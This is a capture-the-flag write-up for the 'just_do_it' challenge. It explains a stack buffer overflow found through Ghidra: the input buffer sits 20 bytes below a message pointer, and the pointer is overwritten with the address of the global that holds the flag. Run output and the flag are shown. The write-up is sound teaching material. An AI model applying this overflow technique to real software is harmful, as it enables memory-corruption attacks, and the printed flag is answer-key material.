# Just_do_it Writeup

## Steps:
1. Open in ghidra and analyze
    - Notice the password checking; even if we set the input to P@SSW0RD, the output message is set as "Correct Password, Welcome!" rather than the flag
```
  iVar2 = strcmp(input,PASSWORD);
  if (iVar2 == 0) {
    out = success_message;
  }
  puts(out);

```
    - Instead, notice flag.txt is read into a global variable at 0x0804a080. So we will replace out with that so the flag is printed with `puts`
2. Look at the stack variable layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     080485c2(R), 
                                                                                                   08048708(*)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048704(R)  
             undefined4        Stack[-0x14]:4 out                                     XREF[2]:     0804860d(W), 
                                                                                                   080486ee(W)  
             undefined4        Stack[-0x18]:4 fp                                      XREF[3]:     08048625(W), 
                                                                                                   08048628(R), 
                                                                                                   0804864b(R)  
             undefined1[16]    Stack[-0x28]   input                                   XREF[2]:     080486a6(*), 
                                                                                                   080486d9(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080484d7(*), 0804886c, 
                                                                                          080488c8(*)  
        080485bb 8d 4c 24 04     LEA        ECX=>Stack[0x4],[ESP + 0x4]

```
input is at `Stack[-0x28]` and the variable we want to change (renamed 'out') is at `Stack[-0x14]`
`0x28 - 0x14 = 0x14` which is 20 bytes in decimal. Since we can write `0x20` (`32`) bytes to input, we can access and change `out`
3. Create a payload overwriting the 20 bytes from 'input' to 'out' and set `out = 0x0804a080`
4. Send payload to process


## Solution:
```
$ python3 ex_just.py 
[+] Starting local process './just_do_it': pid 63659
[*] Switching to interactive mode
Welcome my secret service. Do you know the password?
Input the password.
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive
$ 
[*] Process './just_do_it' stopped with exit code -11 (SIGSEGV) (pid 63659)
[*] Got EOF while sending in interactive
```
